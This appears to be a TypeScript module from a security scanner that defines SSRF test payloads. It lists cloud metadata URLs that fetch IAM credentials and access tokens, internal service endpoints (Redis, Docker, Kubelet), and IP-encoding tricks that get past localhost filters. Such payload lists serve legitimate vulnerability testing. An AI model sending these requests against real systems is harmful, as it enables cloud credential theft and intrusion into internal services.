import type { SsrfPayload } from "./types.js";

// ── 1. AWS EC2 Metadata (IMDSv1) ───────────────────────────────────────
const AWS_PATTERNS = [/ami-id/i, /instance-id/i, /AccessKeyId/i, /SecretAccessKey/i];
const AWS_EC2_METADATA: SsrfPayload[] = [
  {
    url: "http://169.254.169.254/latest/meta-data/",
    label: "AWS EC2 metadata root",
    category: "AWS",
    patterns: AWS_PATTERNS,
  },
  {
    url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    label: "AWS IAM security credentials",
    category: "AWS",
    patterns: AWS_PATTERNS,
  },
  {
    url: "http://169.254.169.254/latest/user-data",
    label: "AWS EC2 user-data",
    category: "AWS",
    patterns: [/#!/, /cloud-init/i, /AccessKeyId/i, /password/i],
  },
];

// ── 2. GCP Metadata ────────────────────────────────────────────────────
const GCP_METADATA: SsrfPayload[] = [
  {
    url: "http://metadata.google.internal/computeMetadata/v1/",
    label: "GCP metadata root",
    category: "GCP",
    patterns: [/project-id/i, /zone/i, /instance\//i],
  },
  {
    url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    label: "GCP service account token",
    category: "GCP",
    patterns: [/access_token/i, /token_type/i],
  },
];

// ── 3. Azure Metadata ──────────────────────────────────────────────────
const AZURE_METADATA: SsrfPayload[] = [
  {
    url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    label: "Azure instance metadata",
    category: "Azure",
    patterns: [/vmId/i, /subscriptionId/i, /resourceGroupName/i],
  },
  {
    url: "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
    label: "Azure managed identity token",
    category: "Azure",
    patterns: [/access_token/i, /token_type/i, /expires_on/i],
  },
];

// ── 4. DigitalOcean Metadata ───────────────────────────────────────────
const DIGITALOCEAN_METADATA: SsrfPayload[] = [
  {
    url: "http://169.254.169.254/metadata/v1.json",
    label: "DigitalOcean droplet metadata",
    category: "DigitalOcean",
    patterns: [/droplet_id/i, /region/i, /hostname/i],
  },
];

// ── 5. Alibaba Cloud Metadata ──────────────────────────────────────────
const ALIBABA_METADATA: SsrfPayload[] = [
  {
    url: "http://100.100.100.200/latest/meta-data/",
    label: "Alibaba Cloud instance metadata",
    category: "Alibaba",
    patterns: [/instance-id/i, /image-id/i, /hostname/i],
  },
];

// ── 6. Oracle Cloud Metadata ───────────────────────────────────────────
const ORACLE_METADATA: SsrfPayload[] = [
  {
    url: "http://169.254.169.254/opc/v2/instance/",
    label: "Oracle Cloud instance metadata",
    category: "Oracle",
    patterns: [/displayName/i, /compartmentId/i, /shape/i],
  },
];

// ── 7. Internal Services ───────────────────────────────────────────────
const ES_PATTERNS = [/You Know, for Search/i, /"cluster_name"/i, /lucene_version/i];
const INTERNAL_SERVICES: SsrfPayload[] = [
  {
    url: "http://127.0.0.1:9200/",
    label: "Elasticsearch",
    category: "Internal",
    patterns: ES_PATTERNS,
  },
  {
    url: "http://127.0.0.1:6379/INFO",
    label: "Redis",
    category: "Internal",
    patterns: [/redis_version/i, /connected_clients/i, /used_memory/i],
  },
  {
    url: "http://127.0.0.1:8500/v1/agent/self",
    label: "Consul agent",
    category: "Internal",
    patterns: [/"Config"/i, /"Member"/i, /consul/i],
  },
  {
    url: "http://127.0.0.1:2375/version",
    label: "Docker API",
    category: "Internal",
    patterns: [/ApiVersion/i, /MinAPIVersion/i, /Os/i],
  },
  {
    url: "https://127.0.0.1:10250/pods",
    label: "Kubelet pods",
    category: "Internal",
    patterns: [/"items"/i, /"metadata"/i, /"spec"/i],
  },
];

// ── 8. Localhost Bypasses ──────────────────────────────────────────────
const LOCALHOST_BYPASSES: SsrfPayload[] = [
  {
    url: "http://0177.0.0.1:9200/",
    label: "Localhost via octal",
    category: "Bypass",
    patterns: ES_PATTERNS,
  },
  {
    url: "http://2130706433:9200/",
    label: "Localhost via decimal",
    category: "Bypass",
    patterns: ES_PATTERNS,
  },
  {
    url: "http://0x7f000001:9200/",
    label: "Localhost via hex",
    category: "Bypass",
    patterns: ES_PATTERNS,
  },
  {
    url: "http://[::1]:9200/",
    label: "Localhost via IPv6",
    category: "Bypass",
    patterns: ES_PATTERNS,
  },
  {
    url: "http://0.0.0.0:9200/",
    label: "Localhost via 0.0.0.0",
    category: "Bypass",
    patterns: ES_PATTERNS,
  },
  {
    url: "http://127.1:9200/",
    label: "Localhost via shorthand",
    category: "Bypass",
    patterns: ES_PATTERNS,
  },
];

// ── 9. Metadata IP Bypasses ────────────────────────────────────────────
const METADATA_BYPASSES: SsrfPayload[] = [
  {
    url: "http://0xa9fea9fe/latest/meta-data/",
    label: "Metadata IP via hex",
    category: "Bypass",
    patterns: AWS_PATTERNS,
  },
  {
    url: "http://2852039166/latest/meta-data/",
    label: "Metadata IP via decimal",
    category: "Bypass",
    patterns: AWS_PATTERNS,
  },
  {
    url: "http://[::ffff:169.254.169.254]/latest/meta-data/",
    label: "Metadata IP via IPv6-mapped",
    category: "Bypass",
    patterns: AWS_PATTERNS,
  },
];

export const SSRF_PAYLOADS: SsrfPayload[] = [
  ...AWS_EC2_METADATA,
  ...GCP_METADATA,
  ...AZURE_METADATA,
  ...DIGITALOCEAN_METADATA,
  ...ALIBABA_METADATA,
  ...ORACLE_METADATA,
  ...INTERNAL_SERVICES,
  ...LOCALHOST_BYPASSES,
  ...METADATA_BYPASSES,
];

export const SSRF_PAYLOAD_STRINGS: string[] = SSRF_PAYLOADS.map((p) => p.url);
